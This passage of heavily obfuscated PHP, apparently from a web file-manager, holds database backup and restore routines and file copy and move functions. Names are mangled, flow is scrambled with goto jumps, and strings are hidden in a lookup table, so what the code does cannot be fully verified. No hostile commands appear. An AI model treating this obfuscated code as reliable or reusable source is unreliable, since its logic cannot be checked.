F£¥¤·«šê; Cá“Ù±ÚÙ: $this->database = $Bˆˆ­Ñ¹Ô; $dåšŠùàßÚ = $this->model()->db(); try { $CÏôØéÏº = $dåšŠùàßÚ->execute("\163\x68\157\x77\40\x64\x61\x74\x61\142\x61\163\x65\163\x20\x6c\151\x6b\145\40\x27{$EÎ„Çà×Å}\47"); } catch (Exception $A‚›éğ¤) { } goto D®¡äßËø; F£¥¤·«šê: $this->database = $Bˆˆ­Ñ¹Ô; $dåšŠùàßÚ->execute("\165\x73\x65\x20\x60{$EÎ„Çà×Å}\140"); return $dåšŠùàßÚ; goto càŸ‹ÀØé; E…»ŞœÑÓ: $b¾ÂâåÏŠ× =& $_SERVER[ä°„ä°º]; $Bˆˆ­Ñ¹Ô = array_change_key_case($this->database); if ($this->type == $b¾ÂâåÏŠ×[9] || !$eÜ Ğ—¶Îå) { return $this->model()->db(); } goto aÂÃ¹¶ë„÷; aÂÃ¹¶ë„÷: $EÎ„Çà×Å = $Bˆˆ­Ñ¹Ô[$b¾ÂâåÏŠ×[951]]; $Bˆˆ­Ñ¹Ô[$b¾ÂâåÏŠ×[951]] = $b¾ÂâåÏŠ×[33]; if ($Bˆˆ­Ñ¹Ô[$b¾ÂâåÏŠ×[777]] == $b¾ÂâåÏŠ×[778]) { $fÊéµ‹Š·Å = $Bˆˆ­Ñ¹Ô[$b¾ÂâåÏŠ×[779]]; $Bˆˆ­Ñ¹Ô[$b¾ÂâåÏŠ×[779]] = substr($fÊéµ‹Š·Å, 0, strrpos($fÊéµ‹Š·Å, $b¾ÂâåÏŠ×[1038])); } goto Cá“Ù±ÚÙ; càŸ‹ÀØé: } public function createTable($DªˆéÒÛù, $e·È¿ØÀÇœ = null) { $C”šŒ¼Ú˜Î =& $_SERVER[ä°„ä°º]; if (!IO::exist($DªˆéÒÛù)) { ActionCall($C”šŒ¼Ú˜Î[1039], !0, 0); show_json(LNG($C”šŒ¼Ú˜Î[1040]), !1); } $c„áÓáŠŞ = sqlSplit(IO::getContent($DªˆéÒÛù)); foreach ($c„áÓáŠŞ as $F‚ŠĞ¸Ä”°) { if ($e·È¿ØÀÇœ) { $D“ê–Ïí™ = stripos($F‚ŠĞ¸Ä”°, $C”šŒ¼Ú˜Î[1041]) === 0; if ($D“ê–Ïí™) { $e·È¿ØÀÇœ->task[$C”šŒ¼Ú˜Î[1042]] += 1; } } $this->model()->db()->execute($F‚ŠĞ¸Ä”°); if ($e·È¿ØÀÇœ && $D“ê–Ïí™) { preg_match($C”šŒ¼Ú˜Î[1043], $F‚ŠĞ¸Ä”°, $dÍÇˆæÍªÄ); $e·È¿ØÀÇœ->task[$C”šŒ¼Ú˜Î[1044]] = $dÍÇˆæÍªÄ[1]; $e·È¿ØÀÇœ->update(1); } } $this->taskToCache($e·È¿ØÀÇœ); } public function insertTable($A¤àÃ¶  ¯, $fÒùõäÑ = null) { $fŠŸàÉÜß‚ =& $_SERVER[ä°„ä°º]; $cßØÑ¢Á­‹ = $this->model()->db(); $BÑºœÖ­¼Â = $E˜ò¸‰—‚ñ ? array($E˜ò¸‰—‚ñ) : $cßØÑ¢Á­‹->getTables(); foreach ($A¤àÃ¶  ¯ as $bÁ„äµïŒ) { $E˜ò¸‰—‚ñ = basename($bÁ„äµïŒ, $fŠŸàÉÜß‚[769]); if (!in_array($E˜ò¸‰—‚ñ, $BÑºœÖ­¼Â)) { continue; } if ($fÒùõäÑ) { $fÒùõäÑ->task[$fŠŸàÉÜß‚[1044]] = $E˜ò¸‰—‚ñ; } if (get_filesize($bÁ„äµïŒ) == 0) { continue; } $f‚™¾¢µÔ = $this->sqlToDb($bÁ„äµïŒ, $fÒùõäÑ); if (!$f‚™¾¢µÔ) { ActionCall($fŠŸàÉÜß‚[1039], !0, 0); show_json(LNG($fŠŸàÉÜß‚[1045]) . "\133{$E˜ò¸‰—‚ñ}\135", !1); } } $this->taskToCache($fÒùõäÑ); } public function sqlFromDb($A¥ òçŠù, $C¥ÃóÖÊ†Ò, $Añ‡ì¸ôÁÍ = null, $BŞ­–‹ = null) { goto eå‚˜¬ÃŸ¾; cÕ©¾»¸Î: fclose($fãæÄİØ“Â); return $bå©¬ÚøÙ…; goto BëèŠğƒ³‹; C¼ºˆñˆõ: $F–§÷š„§‰ = 0; $bÃâ®Ä±Š’ = 10000; $fãæÄİØ“Â = fopen($C¥ÃóÖÊ†Ò, $_SERVER[ä°„ä°º][1046]); goto aÉ°Ñ²“­á; eå‚˜¬ÃŸ¾: if ($Añ‡ì¸ôÁÍ) { $Añ‡ì¸ôÁÍ->task[$_SERVER[ä°„ä°º][1044]] = $A¥ òçŠù; } $fÖ’È˜”ƒÑ = $this->model($A¥ òçŠù); $bå©¬ÚøÙ… = 0; goto C¼ºˆñˆõ; aÉ°Ñ²“­á: $D“©³³ºŒë = $fÖ’È˜”ƒÑ->getPk(); $B¤¬Éçªˆ‚ = $fÖ’È˜”ƒÑ->getDbFields(); do { $A²¯Ñïªø = array($D“©³³ºŒë => array($_SERVER[ä°„ä°º][993], $F–§÷š„§‰)); $E¢îÌ£Ÿ¼ˆ = $fÖ’È˜”ƒÑ->where($A²¯Ñïªø)->field($B¤¬Éçªˆ‚)->order($D“©³³ºŒë . $_SERVER[ä°„ä°º][1047])->limit($bÃâ®Ä±Š’)->select(); $E¢îÌ£Ÿ¼ˆ = !empty($E¢îÌ£Ÿ¼ˆ) ? $E¢îÌ£Ÿ¼ˆ : array(); if (!($fÇÁì·†¨Ì = count($E¢îÌ£Ÿ¼ˆ))) { break; } $aÈ‚µõß² = end($E¢îÌ£Ÿ¼ˆ); $F–§÷š„§‰ = $aÈ‚µõß²[$D“©³³ºŒë]; $dÂÊÂìĞêË = array(); foreach ($E¢îÌ£Ÿ¼ˆ as $dÖêÛ”–î) { if ($A¥ òçŠù == $_SERVER[ä°„ä°º][1048] && $dÖêÛ”–î[$_SERVER[ä°„ä°º][29]] == $_SERVER[ä°„ä°º][1049]) { $AÈÙ˜¥Ğêö = json_decode($dÖêÛ”–î[$_SERVER[ä°„ä°º][372]], !0); if ($AÈÙ˜¥Ğêö[$_SERVER[ä°„ä°º][28]] == date($_SERVER[ä°„ä°º][734]) && !$AÈÙ˜¥Ğêö[$_SERVER[ä°„ä°º][733]]) { continue; } } if ($BŞ­–‹) { $dÖêÛ”–î[$_SERVER[ä°„ä°º][76]] = "\x7b\x69\x6f\72{$BŞ­–‹}\175" . substr($dÖêÛ”–î[$_SERVER[ä°„ä°º][76]], strlen("\x7b\151\157\x3a{$dÖêÛ”–î[$_SERVER[ä°„ä°º][805]]}\x7d")); $dÖêÛ”–î[$_SERVER[ä°„ä°º][805]] = $BŞ­–‹; } $dÂÊÂìĞêË[] = $_SERVER[ä°„ä°º][1050] . $this->sqlEncode($dÖêÛ”–î) . $_SERVER[ä°„ä°º][1051]; } $aÄâŠÂå• = "\x49\116\x53\105\122\x54\40\x49\x4e\x54\x4f\x20\140{$A¥ òçŠù}\140\40\x28\x60" . implode($_SERVER[ä°„ä°º][1052], $B¤¬Éçªˆ‚) . $_SERVER[ä°„ä°º][1053]; fwrite($fãæÄİØ“Â, $aÄâŠÂå• . implode($_SERVER[ä°„ä°º][1054], $dÂÊÂìĞêË) . $_SERVER[ä°„ä°º][68] . PHP_EOL); $bå©¬ÚøÙ… += $fÇÁì·†¨Ì; if ($Añ‡ì¸ôÁÍ) { $Añ‡ì¸ôÁÍ->update($fÇÁì·†¨Ì); } } while ($bÃâ®Ä±Š’ == $fÇÁì·†¨Ì); goto cÕ©¾»¸Î; BëèŠğƒ³‹: } public function sqlToDb($D·ÜªæÅ¯ï, $fÓõÖĞèÒ = null) { goto CÂÊ±°Õ¤œ; C¢¬œ¢åÊ: if (!empty($e´‚©„ÜóÎ)) { $AÓÅ®Šƒ®ó = $a»§‘Á¼äã . implode($D¿³¼¢Ïãš[47], $e´‚©„ÜóÎ); if (!$b£êÍÜ¬->execute($AÓÅ®Šƒ®ó)) { return !1; } if ($fÓõÖĞèÒ) { $fÓõÖĞèÒ->update($aå²©§º‰›); } } return !0; goto B…‹ä³åÁ«; CÂÊ±°Õ¤œ: $D¿³¼¢Ïãš =& $_SERVER[ä°„ä°º]; $b£êÍÜ¬ = $this->model()->db(); $dˆŒ¢Ñéƒ = @fopen($D·ÜªæÅ¯ï, $D¿³¼¢Ïãš[1055]); goto d’Œ‹†Õ»; BÒ‡‡êõ‘°: if ($aÍó•Óƒ¬‰ == $D¿³¼¢Ïãš[1056]) { $dİÁ»ƒ™§ = 50; } while (!feof($dˆŒ¢Ñéƒ)) { $Bãí³¥Šå = trim(fgets($dˆŒ¢Ñéƒ)); if (!$Bãí³¥Šå) { continue; } $AÓÅ®Šƒ®ó = $this->sqlDecode($Bãí³¥Šå, $this->type); if (stripos($AÓÅ®Šƒ®ó, $D¿³¼¢Ïãš[353]) === 0) { if (!$a»§‘Á¼äã) { $a»§‘Á¼äã = $AÓÅ®Šƒ®ó . $D¿³¼¢Ïãš[50]; } continue; } if ($fÓõÖĞèÒ) { $fÓõÖĞèÒ->task[$D¿³¼¢Ïãš[1042]] += 1; } $aå²©§º‰›++; $e´‚©„ÜóÎ[] = rtrim(rtrim(trim($AÓÅ®Šƒ®ó), $D¿³¼¢Ïãš[47]), $D¿³¼¢Ïãš[68]); if ($aå²©§º‰› >= $dİÁ»ƒ™§) { $AÓÅ®Šƒ®ó = $a»§‘Á¼äã . implode($D¿³¼¢Ïãš[47], $e´‚©„ÜóÎ); if (!$b£êÍÜ¬->execute($AÓÅ®Šƒ®ó)) { return !1; } if ($fÓõÖĞèÒ) { $fÓõÖĞèÒ->update($aå²©§º‰›); } $e´‚©„ÜóÎ = array(); $aå²©§º‰› = 0; } } fclose($dˆŒ¢Ñéƒ); goto C¢¬œ¢åÊ; d’Œ‹†Õ»: if (!$dˆŒ¢Ñéƒ) { return !1; } $aå²©§º‰› = 0; $a»§‘Á¼äã = $D¿³¼¢Ïãš[33]; goto b­“ìô«£–; b­“ìô«£–: $e´‚©„ÜóÎ = array(); $dİÁ»ƒ™§ = $this->type == $D¿³¼¢Ïãš[9] ? 500 : 2000; $aÍó•Óƒ¬‰ = basename($D·ÜªæÅ¯ï, $D¿³¼¢Ïãš[769]); goto BÒ‡‡êõ‘°; B…‹ä³åÁ«: } public function dropTable($a²µ÷˜×ä‡ = null) { $C²„³ë±ÀÇ = $this->model()->db(); $a§î²´åÈÏ = $a²µ÷˜×ä‡ ? array($a²µ÷˜×ä‡) : $C²„³ë±ÀÇ->getTables(); if (!$a§î²´åÈÏ) { return; } foreach ($a§î²´åÈÏ as $a²µ÷˜×ä‡) { $C²„³ë±ÀÇ->execute("\x64\x72\x6f\160\x20\x74\141\x62\x6c\145\40\151\x66\x20\145\x78\x69\x73\x74\x73\40\140{$a²µ÷˜×ä‡}\140"); } } private function taskToCache($eñ†„¬ï¶ = null) { $A‘—éÌ¹ =& $_SERVER[ä°„ä°º]; if (!$eñ†„¬ï¶) { return; } $Eù¡à÷ÚÎà = array($A‘—éÌ¹[1044] => $eñ†„¬ï¶->task[$A‘—éÌ¹[1044]], $A‘—éÌ¹[1042] => $eñ†„¬ï¶->task[$A‘—éÌ¹[1042]], $A‘—éÌ¹[1057] => $eñ†„¬ï¶->task[$A‘—éÌ¹[1057]]); if ($Eù¡à÷ÚÎà[$A‘—éÌ¹[1042]] == $Eù¡à÷ÚÎà[$A‘—éÌ¹[1057]]) { $Eù¡à÷ÚÎà[$A‘—éÌ¹[743]] = 1; } Cache::set($A‘—éÌ¹[1058] . $eñ†„¬ï¶->task[$A‘—éÌ¹[393]], $Eù¡à÷ÚÎà); $eñ†„¬ï¶->end(); } private function sqlEncode($b“ÉÖíëÎ³) { $dÀÂâä•Õæ =& $_SERVER[ä°„ä°º]; $FÕ×ğ°–¨Ô = array(); foreach ($b“ÉÖíëÎ³ as $cù¾¢Ú¤æå) { if (is_array($cù¾¢Ú¤æå)) { $cù¾¢Ú¤æå = json_encode_force($cù¾¢Ú¤æå); } $cù¾¢Ú¤æå = addslashes($cù¾¢Ú¤æå); $cù¾¢Ú¤æå = str_replace(array($dÀÂâä•Õæ[1059], $dÀÂâä•Õæ[229]), array($dÀÂâä•Õæ[1060], $dÀÂâä•Õæ[1061]), $cù¾¢Ú¤æå); $FÕ×ğ°–¨Ô[] = str_replace($dÀÂâä•Õæ[55], $dÀÂâä•Õæ[1062], $cù¾¢Ú¤æå); } return $dÀÂâä•Õæ[55] . implode($dÀÂâä•Õæ[1063], $FÕ×ğ°–¨Ô) . $dÀÂâä•Õæ[55]; } private function sqlDecode($aâë ª¥«, $AëÌÅåíˆ) { $eº”·¼Œù£ =& $_SERVER[ä°„ä°º]; $aâë ª¥« = str_replace(array($eº”·¼Œù£[1060], $eº”·¼Œù£[1061]), array($eº”·¼Œù£[1059], $eº”·¼Œù£[229]), $aâë ª¥«); if ($AëÌÅåíˆ == $eº”·¼Œù£[9]) { $aâë ª¥« = stripslashes($aâë ª¥«); } return $aâë ª¥«; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($AÒê—ª—¡Ä, $dò©‘¤ğ£·) { goto b•“ËÒë×±; b•“ËÒë×±: $a°µ—±Æñ =& $_SERVER[ä°„ä°º]; $dˆ›·é÷· = $dò©‘¤ğ£·; $GLOBALS[$a°µ—±Æñ[1064]] = $a°µ—±Æñ[1065] . $AÒê—ª—¡Ä; goto EÛ¯ªËß‰Î; EÛ¯ªËß‰Î: Hook::trigger($a°µ—±Æñ[1065] . $AÒê—ª—¡Ä . $a°µ—±Æñ[1066], $dˆ›·é÷·); $cÙŒ¤ïî—˜ = self::driverMake($dò©‘¤ğ£·[0]); if (method_exists($cÙŒ¤ïî—˜, $AÒê—ª—¡Ä)) { $B‚ÃˆÏÕĞø = @call_user_func_array(array($cÙŒ¤ïî—˜, $AÒê—ª—¡Ä), $dò©‘¤ğ£·); } else { if (method_exists($cÙŒ¤ïî—˜, $a°µ—±Æñ[1067])) { $B‚ÃˆÏÕĞø = @call_user_func_array(array($cÙŒ¤ïî—˜, $AÒê—ª—¡Ä), $dò©‘¤ğ£·); } else { if (method_exists(self, $AÒê—ª—¡Ä)) { $B‚ÃˆÏÕĞø = @call_user_func_array(array(self, $AÒê—ª—¡Ä), $dò©‘¤ğ£·); } else { $B‚ÃˆÏÕĞø = call_user_func_array(array(parent, $AÒê—ª—¡Ä), $dò©‘¤ğ£·); } } } goto aÌ°¾®…‚¹; aÌ°¾®…‚¹: Hook::trigger($a°µ—±Æñ[1065] . $AÒê—ª—¡Ä . $a°µ—±Æñ[1068], $dˆ›·é÷·, $B‚ÃˆÏÕĞø); return $B‚ÃˆÏÕĞø; goto cñ…¢Ùó§ë; cñ…¢Ùó§ë: } public static function init($aÕ»˜¨õ´) { return self::driverMake($aÕ»˜¨õ´); } public static function copy($CÒ¥²§¡¦‘, $B«®äâÉâ…, $aÁŞ¸ Ğ· = false, $f¨¿ÉÄ³’â = false) { return self::copyMoveStart($CÒ¥²§¡¦‘, $B«®äâÉâ…, $aÁŞ¸ Ğ·, $_SERVER[ä°„ä°º][531], $f¨¿ÉÄ³’â); } public static function move($A‚š»µÕšé, $aÌ‹­ƒ‹ö, $C†í‰·‰ò = false, $d“—¡ìµ´æ = false) { return self::copyMoveStart($A‚š»µÕšé, $aÌ‹­ƒ‹ö, $C†í‰·‰ò, $_SERVER[ä°„ä°º][533], $d“—¡ìµ´æ); } private static function copyMoveStart($cáîøñêŸ, $f‰­ô–»Ö“, $Eèø¤æØÌÈ, $cÊõÛ¨Ôã¦, $B‘º÷ª±Ñ‚) { $AŒã‘¿â“ =& $_SERVER[ä°„ä°º]; $d™õĞ±¢ = array($cáîøñêŸ, $f‰­ô–»Ö“, $Eèø¤æØÌÈ, $B‘º÷ª±Ñ‚); Hook::trigger($AŒã‘¿â“[1065] . $cÊõÛ¨Ôã¦ . $AŒã‘¿â“[1066], $d™õĞ±¢); $F‰çŒä‹ß = self::copyMove($cáîøñêŸ, $f‰­ô–»Ö“, $Eèø¤æØÌÈ, $cÊõÛ¨Ôã¦, $B‘º÷ª±Ñ‚); Hook::trigger($AŒã‘¿â“[1065] . $cÊõÛ¨Ôã¦ . $AŒã‘¿â“[1068], $d™õĞ±¢, $F‰çŒä‹ß); return $F‰çŒä‹ß; } public static function saveFile($E¾î¹åÔŒÔ, $CÍºëè±íó, $C‰Å”¿ÓÏ… = true) { goto d›êê›í††; fâÊÚœ•¼: if (!$C‰Å”¿ÓÏ… && self::driverIsSame($E¹¡×‡©, $D¤äÇ£ªîÎ)) { $CãÏØê§‘ = !1; } $EÀİ«çìµŠ = self::copyFile($E¹¡×‡©, $E¾î¹åÔŒÔ, $D¤äÇ£ªîÎ, $CÀØ¬‚Ò‡, $däŠì”‡õˆ[$fç»®ºö[28]], $CãÏØê§‘); if ($F…ÍÂˆ¾‡) { $EÀİ«çìµŠ = $F…ÍÂˆ¾‡->getPathOuter($EÀİ«çìµŠ); } goto BêëÆŸëÈ; f¼ ‡»ª×«: $D¤äÇ£ªîÎ = self::driverMake($CÍºëè±íó); $F…ÍÂˆ¾‡ = !1; if ($D¤äÇ£ªîÎ->pathParse[$fç»®ºö[1069]]) { $F…ÍÂˆ¾‡ = $D¤äÇ£ªîÎ; $D¤äÇ£ªîÎ = self::driverMake($D¤äÇ£ªîÎ->pathParse[$fç»®ºö[1069]]); } goto CÚ–é¤Ö” ; BêëÆŸëÈ: return $EÀİ«çìµŠ; goto aÀîâƒ÷®™; CÚ–é¤Ö” : if ($E¹¡×‡©->pathParse[$fç»®ºö[1069]]) { $E¹¡×‡© = self::driverMake($E¹¡×‡©->pathParse[$fç»®ºö[1069]]); } $CÀØ¬‚Ò‡ = $D¤äÇ£ªîÎ->pathFather($CÍºëè±íó); $CãÏØê§‘ = !0; goto fâÊÚœ•¼; d›êê›í††: $fç»®ºö =& $_SERVER[ä°„ä°º]; $däŠì”‡õˆ = self::info($CÍºëè±íó); $E¹¡×‡© = self::driverMake($E¾î¹åÔŒÔ); goto f¼ ‡»ª×«; aÀîâƒ÷®™: } private static function copyMove($Bƒˆã–„òƒ, $D•‡Ä®–Ç, $b»»­òËŒ–, $bÇ§«ó™¬Ò, $BÖÅì÷»† = false) { goto dÁğ¾ÒØˆÎ; b²ñéçÇã®: if ($C¶Ë‚¬âÜ¦) { if ($bÇ§«ó™¬Ò == $C¸™ò¬™Ê[533] && !method_exists($c±–ÁäŞÛ·, $C¸™ò¬™Ê[1070]) && trim($D•‡Ä®–Ç, $C¸™ò¬™Ê[8]) == trim($c±–ÁäŞÛ·->pathFather($Bƒˆã–„òƒ), $C¸™ò¬™Ê[8])) { if ($c¹‰§—÷µ->pathThis($Bƒˆã–„òƒ) != $BÖÅì÷»† && !$c¹‰§—÷µ->isTypeObject()) { return $c¹‰§—÷µ->rename($Bƒˆã–„òƒ, $BÖÅì÷»†); } return $c±–ÁäŞÛ·->getPathOuter($Bƒˆã–„òƒ); } if (method_exists($c±–ÁäŞÛ·, $bÇ§«ó™¬Ò)) { return $c±–ÁäŞÛ·->{$bÇ§«ó™¬Ò}($Bƒˆã–„òƒ, $D•‡Ä®–Ç, $b»»­òËŒ–); } } $D™¢‰¿‚Šœ = $c¹‰§—÷µ->isFile($Bƒˆã–„òƒ); if (!$D™¢‰¿‚Šœ && $c±–ÁäŞÛ·->getType() == $C¸™ò¬™Ê[741] && $c¹‰§—÷µ->getType() == $C¸™ò¬™Ê[106]) { $bÜ†·¾¬é´ = $c±–ÁäŞÛ·->copyFolderFromIO($c¹‰§—÷µ, $Bƒˆã–„òƒ, $D•‡Ä®–Ç, $b»»­òËŒ–, $côç¤ÕùíÉ, $BÖÅì÷»†); } else { $bÜ†·¾¬é´ = self::copyPath($c¹‰§—÷µ, $Bƒˆã–„òƒ, $c±–ÁäŞÛ·, $D•‡Ä®–Ç, $b»»­òËŒ–, $côç¤ÕùíÉ, $D™¢‰¿‚Šœ, $BÖÅì÷»†); } goto E‚è™Ì¸µô; dÁğ¾ÒØˆÎ: $C¸™ò¬™Ê =& $_SERVER[ä°„ä°º]; if (!$Bƒˆã–„òƒ || $Bƒˆã–„òƒ == $C¸™ò¬™Ê[8] || !$D•‡Ä®–Ç) { return !1; } ignore_timeout(); goto a¯æëñÕ÷ˆ; E‚è™Ì¸µô: if ($bÜ†·¾¬é´ && $côç¤ÕùíÉ) { $c¹‰§—÷µ->remove($Bƒˆã–„òƒ); } if ($C°òõÚØå) { $bÜ†·¾¬é´ = $C°òõÚØå->getPathOuter($bÜ†·¾¬é´); } return $bÜ†·¾¬é´; goto C…‹ÒĞ„áç; a¯æëñÕ÷ˆ: $c¹‰§—÷µ = self::driverMake($Bƒˆã–„òƒ); $c±–ÁäŞÛ· = self::driverMake($D•‡Ä®–Ç); $côç¤ÕùíÉ = $bÇ§«ó™¬Ò == $C¸™ò¬™Ê[533]; goto cíî­íÒÛã; e­Ë™Ê‰İì: self::check($c¹‰§—÷µ, $Bƒˆã–„òƒ, $c±–ÁäŞÛ·, $D•‡Ä®–Ç); Hook::trigger($C¸™ò¬™Ê[73], $c¹‰§—÷µ, $Bƒˆã–„òƒ, $c±–ÁäŞÛ·, $D•‡Ä®–Ç); $C¶Ë‚¬âÜ¦ = self::driverIsSame($c¹‰§—÷µ, $c±–ÁäŞÛ·); goto b²ñéçÇã®; cíî­íÒÛã: $C°òõÚØå = !1; if ($c±–ÁäŞÛ·->pathParse[$C¸™ò¬™Ê[1069]]) { $C°òõÚØå = $c±–ÁäŞÛ·; $c±–ÁäŞÛ· = self::driverMake($c±–ÁäŞÛ·->pathParse[$C¸™ò¬™Ê[1069]]); } if ($c¹‰§—÷µ->pathParse[$C¸™ò¬™Ê[1069]]) { $c¹‰§—÷µ = self::driverMake($c¹‰§—÷µ->pathParse[$C¸™ò¬™Ê[1069]]); } goto e­Ë™Ê‰İì; C…‹ÒĞ„áç: } private static function check($DÒôÛ‹—º, $D½È±´Óëù, $Fõ÷ ¤µ–ê, &$Cˆ¹×ÏÃå) { $c×…¾ê©‘– =& $_SERVER[ä°„ä°º]; if (self::driverIsSame($DÒôÛ‹—º, $Fõ÷ ¤µ–ê) && $DÒôÛ‹—º->isFolder($D½È±´Óëù) && $DÒôÛ‹—º->isParentOf($D½È±´Óëù, $Cˆ¹×ÏÃå)) { show_json(LNG($c×…¾ê©‘–[1071]), !1); } if (!$DÒôÛ‹—º->exist($D½È±´Óëù)) { show_json(LNG($c×…¾ê©‘–[105]), !1); } } private static function copyPath($dÊ´öîá, $b×»™¨‰¥ã, $D†Í…‡¢¦ù, $a©©Çä®Û, $FòŒ­ñˆ­å, $D°¬Çø‹“Ã, $F×ìñ›‡œ, $E›²•»Ç« = false) { goto F°ğ‰î´Í; dƒµÊ±Šø¬: if ($F×ìñ›‡œ) { return self::copyFile($dÊ´öîá, $b×»™¨‰¥ã, $D†Í…‡¢¦ù, $a©©Çä®Û, $eå³ŠœÓÈí, $D°¬Çø‹“Ã); } if ($FòŒ­ñˆ­å == REPEAT_RENAME_FOLDER) { $FòŒ­ñˆ­å = !1; } $B  ƒ´ñÍ‚ = rtrim($a©©Çä®Û, $cÌß°’«„›[8]) . $cÌß°’«„›[8] . $eå³ŠœÓÈí; goto D•İ®ï¶’Æ; F·Š©–ßÚÕ: self::copyMoveKeepInfo($dÊ´öîá, $b×»™¨‰¥ã, $c‰µ¿Ø—¬¯); return $c‰µ¿Ø—¬¯; goto f¡Îø‚–Ãö; D•İ®ï¶’Æ: $c‰µ¿Ø—¬¯ = $D†Í…‡¢¦ù->mkdir($D†Í…‡¢¦ù->getPath($B  ƒ´ñÍ‚)); $a©©Çä®Û = $D†Í…‡¢¦ù->getPathInner($c‰µ¿Ø—¬¯); $BÌØöÃö¼ù = $dÊ´öîá->listPath($b×»™¨‰¥ã, !0); goto F¼ìŞÃÆ; F¼ìŞÃÆ: $BÌØöÃö¼ù = is_array($BÌØöÃö¼ù) ? $BÌØöÃö¼ù : array($cÌß°’«„›[74] => array(), $cÌß°’«„›[75] => array()); $DÍ—¸Í…˜ = array_merge($BÌØöÃö¼ù[$cÌß°’«„›[74]], $BÌØöÃö¼ù[$cÌß°’«„›[75]]); foreach ($DÍ—¸Í…˜ as $D²é„šƒ†) { $dÏ¬î¾¡Åä = $D²é„šƒ†[$cÌß°’«„›[29]] == $cÌß°’«„›[193]; $b×»™¨‰¥ã = $dÊ´öîá->getPathInner($D²é„šƒ†[$cÌß°’«„›[76]]); $C³ãâ·ˆ›Ï = self::copyPath($dÊ´öîá, $b×»™¨‰¥ã, $D†Í…‡¢¦ù, $a©©Çä®Û, $FòŒ­ñˆ­å, $D°¬Çø‹“Ã, $dÏ¬î¾¡Åä); if (!$C³ãâ·ˆ›Ï) { IO::errorTips($cÌß°’«„›[1072] . $b×»™¨‰¥ã . $cÌß°’«„›[67] . $a©©Çä®Û); } } goto F·Š©–ßÚÕ; F°ğ‰î´Í: $cÌß°’«„› =& $_SERVER[ä°„ä°º]; $eå³ŠœÓÈí = empty($E›²•»Ç«) && $E›²•»Ç« !== $cÌß°’«„›[191] ? $dÊ´öîá->pathThis($b×»™¨‰¥ã) : $E›²•»Ç«; if ($FòŒ­ñˆ­å) { $céŒô£˜Ú— = $D†Í…‡¢¦ù->fileNameExist($a©©Çä®Û, $eå³ŠœÓÈí); $eå³ŠœÓÈí = $D†Í…‡¢¦ù->fileNameAuto($a©©Çä®Û, $eå³ŠœÓÈí, $FòŒ­ñˆ­å, !$F×ìñ›‡œ); $FòŒ­ñˆ­å = $céŒô£˜Ú— ? $FòŒ­ñˆ­å : !1; } goto dƒµÊ±Šø¬; f¡Îø‚–Ãö: } private static function copyFile($AáÏñùÇØÔ, $D…ÅŞö³Á“, $f†åÍ³½»•, $f±¡ï‡Á», $A‹áï‹ùà, $aœÙØŸ¢¢) { goto bÙ™­å‘Ç; CâÌªùÛÊ: return $câƒ¿©’Ü; goto EµñŒ—Ù¤; cËí¬…Šã‡: $EÈ¥÷æ“ = $AáÏñùÇØÔ->download($D…ÅŞö³Á“, $EÈ¥÷æ“); $EÈ¥÷æ“ = $AáÏñùÇØÔ->iconvApp($EÈ¥÷æ“); $câƒ¿©’Ü = $f†åÍ³½»•->upload($f±¡ï‡Á», $EÈ¥÷æ“, $aœÙØŸ¢¢); goto C¶œĞË§ßš; aÛ’Õ‡ğŸ: Hook::trigger($Cµº©ÃäŠ¤[1074], $AáÏñùÇØÔ, $D…ÅŞö³Á“, $f†åÍ³½»•, $f±¡ï‡Á», $A‹áï‹ùà, $cÛÛÈè½’â); if (self::driverIsSame($AáÏñùÇØÔ, $f†åÍ³½»•)) { if ($aœÙØŸ¢¢) { $câƒ¿©’Ü = $f†åÍ³½»•->moveFile($D…ÅŞö³Á“, $f±¡ï‡Á»); } else { $câƒ¿©’Ü = $f†åÍ³½»•->copyFile($D…ÅŞö³Á“, $f±¡ï‡Á»); } Hook::trigger($Cµº©ÃäŠ¤[1075], $AáÏñùÇØÔ, $D…ÅŞö³Á“, $f†åÍ³½»•, $f±¡ï‡Á», $A‹áï‹ùà, $câƒ¿©’Ü); self::copyMoveKeepInfo($AáÏñùÇØÔ, $D…ÅŞö³Á“, $câƒ¿©’Ü); return $câƒ¿©’Ü; } $C¨àÄì±É‚ = TEMP_FILES; goto BŸçâ‹ÁîŞ; bÙ™­å‘Ç: $Cµº©ÃäŠ¤ =& $_SERVER[ä°„ä°º]; $f±¡ï‡Á» = $f†åÍ³½»•->getPath(rtrim($f±¡ï‡Á», $Cµº©ÃäŠ¤[8]) . $Cµº©ÃäŠ¤[8] . $A‹áï‹ùà); $cÛÛÈè½’â = $Cµº©ÃäŠ¤[1073] . time() . rand_string(5); goto aÛ’Õ‡ğŸ; C¶œĞË§ßš: self::remove($eÊ«ƒÕé‘); Hook::trigger($Cµº©ÃäŠ¤[1075], $AáÏñùÇØÔ, $D…ÅŞö³Á“, $f†åÍ³½»•, $f±¡ï‡Á», $A‹áï‹ùà, $câƒ¿©’Ü); self::copyMoveKeepInfo($AáÏñùÇØÔ, $D…ÅŞö³Á“, $câƒ¿©’Ü); goto CâÌªùÛÊ; CÕê ¢ãÔæ: mk_dir($FÒÂ†•§œ”); $EÈ¥÷æ“ = $FÒÂ†•§œ” . $cÛÛÈè½’â; $eÊ«ƒÕé‘ = $EÈ¥÷æ“; goto cËí¬…Šã‡; BŸçâ‹ÁîŞ: if ($GLOBALS[$Cµº©ÃäŠ¤[6]][$Cµº©ÃäŠ¤[88]][$Cµº©ÃäŠ¤[783]]) { $C¨àÄì±É‚ = $GLOBALS[$Cµº©ÃäŠ¤[6]][$Cµº©ÃäŠ¤[88]][$Cµº©ÃäŠ¤[783]]; } $aœÙØŸ¢¢ = !0; $FÒÂ†•§œ” = $C¨àÄì±É‚; goto CÕê ¢ãÔæ; EµñŒ—Ù¤: } private static function copyMoveKeepInfo($BŸŞ„‡Ÿ’ï, $fÂ·¢ùÁÛÂ, $cƒ÷ØÏË”) { if (!$cƒ÷ØÏË”) { return; } $FäàÈâÂè = $BŸŞ„‡Ÿ’ï->info($fÂ·¢ùÁÛÂ); if (!is_array($FäàÈâÂè)) { return; } IO::setModifyTime($cƒ÷ØÏË”, $FäàÈâÂè[$_SERVER[ä°„ä°º][84]]); } public static function pathFather($Eï¢¹­ÉÌ÷) { $EÁ°Ú“¼“˜ = IO::init($Eï¢¹­ÉÌ÷); $Aìš‘¬åÀ¶ = $EÁ°Ú“¼“˜->pathFather($EÁ°Ú“¼“˜->path); return $EÁ°Ú“¼“˜->getPathOuter($Aìš‘¬åÀ¶); } public static function fileOut($añÔğÀéˆ, $EàÇòÚ­à = false, $BØİ³ø¼¦ = false, 